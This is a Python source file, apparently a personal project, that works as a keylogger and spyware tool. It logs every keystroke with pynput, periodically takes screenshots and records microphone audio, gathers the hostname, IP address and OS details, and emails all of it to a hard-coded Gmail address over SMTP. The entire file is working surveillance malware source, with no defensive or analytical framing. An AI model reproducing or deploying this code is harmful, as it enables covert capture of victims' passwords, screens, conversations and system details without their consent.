# -*- coding: utf-8 -*-
"""
Created on Mon Aug 30 13:52:40 2021

@author: mounish k
"""
#IMPORTS
from pynput.keyboard import Key, Listener   #For listerner to listen to key strokes
import time   #To check the time
import smtplib   #To send emails
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import socket 
import platform
from scipy.io.wavfile import write #To get audio file from recording
import sounddevice as sound #get recording
from PIL import ImageGrab #get screen shot

keys = []
count = 0
email_address = "example@gmail.com" #example
password = "password" #example
toaddr = "exmaple@gmail.com" #example
logkeypath = r"C:\Users\mouni\Downloads\logkeys.txt" #example
screenpath=r"C:\Users\mouni\Downloads\screen.png"  #example
audiopath=r"C:\Users\mouni\Downloads\audioinfo.wav"  #example

currentTime = time.time()
timecount = 6
stoptime = time.time() + timecount


def on_press(key): 
    global count, keys, currentTime, timecount, stoptime
    keys.append(key)
    count +=1
    
    if count>1:
        logs = open(logkeypath,'a')
        logs.write(str(keys))
        count =0
        keys = []   
        
        if time.time()>stoptime:
            send_email("Logkeys.txt", logkeypath,toaddr)
            
            with open(logkeypath, 'w') as file:
                file.write("")
                
            printscreen()
            send_email("screen.png",screenpath,toaddr)
            
            getMicrophone()
            send_email("audioinfo.wav", audiopath ,toaddr)
            
            currentTime = time.time()
            stoptime = time.time() +timecount

   
def on_release(key):
    if key == Key.esc:
        return False

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    
    message = MIMEMultipart()
    message['From'] = fromaddr
    message['To'] = toaddr
    message['Subject'] = "Logs"
    
    body = "MailBody"
    message.attach(MIMEText(body,'plain'))
    filename = filename 
    attachment = open(attachment, 'rb')
    
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    
    p.add_header('Content-Disposition', 'attachment; filename= %s'%filename)
    message.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    
    text = message.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def sys_info():
    with open(r'C:\Users\mouni\Downloads\sysinfo.txt','a') as file:
        hname =socket.gethostname()
        ipaddr = socket.gethostbyname(hname)
        
        file.write("Hostname: "+hname +"\n")
        file.write("IP address: " +ipaddr +"\n")
        file.write("Cpu information: "+platform.processor()+"\n")
        file.write("System: "+platform.system()+"\n")
        file.write("System Version: "+platform.version()+"\n")
        
sys_info()
send_email("sysinfo.txt",r'C:\Users\mouni\Downloads\sysinfo.txt',toaddr)

def getMicrophone():
    freq = 44100 #sample frequency 
    time = 10 #seconds
    
    recording = sound.rec(int(time*freq), samplerate=freq, channels=2)
    sound.wait()
    
    #use scipy.io to make .wav files and to do this write function
    write(audiopath,freq,recording)


def printscreen():
    screen = ImageGrab.grab()
    screen.save(screenpath)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
    



    
